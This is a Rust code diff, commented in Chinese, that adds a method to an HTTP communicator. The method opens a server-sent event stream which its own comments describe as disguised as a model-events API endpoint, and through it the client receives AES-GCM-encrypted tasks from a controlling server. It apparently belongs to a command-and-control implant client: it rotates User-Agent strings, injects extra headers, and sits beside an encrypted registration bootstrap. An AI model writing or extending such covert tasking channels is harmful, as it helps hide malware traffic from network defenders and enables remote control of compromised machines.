@@ -340,6 +340,35 @@ impl HttpCommunicator {
         libra_crypto::decrypt_payload(&cipher, key)
     }
 
+    /// 打开 SSE 任务事件流（伪装为模型事件流：GET /api/v1/models/events?channel=）。
+    /// 服务端挂起连接并主动推送任务/wsNeeded（AES-GCM 密文在 data: 行），
+    /// 30s 注释 keepalive。调用方流式读取 body 逐行解析；401 = 会话丢失。
+    pub async fn open_events(&self, key: &[u8; AES_KEY_SIZE]) -> Result<reqwest::Response, String> {
+        let token = self.session_token.clone().unwrap_or_default();
+        let url = format!(
+            "{}{}?channel={}",
+            self.server_url, "/api/v1/models/events", token
+        );
+        let mut req = self
+            .client
+            .get(&url)
+            .header("Accept", "text/event-stream");
+        if let Some(ua) = self.pick_user_agent() {
+            req = req.header(reqwest::header::USER_AGENT, ua);
+        }
+        req = self.apply_extra_headers(req);
+
+        let resp = req.send().await.map_err(|e| e.to_string())?;
+        let status = resp.status().as_u16();
+        if status == 401 {
+            return Err("SESSION_LOST".to_string());
+        }
+        if status != 200 {
+            return Err(format!("events request failed: {status}"));
+        }
+        Ok(resp)
+    }
+
     /// 注册：op=reg，预会话密钥加密（无会话密钥时的 bootstrap）。
     pub async fn register(
         &mut self,
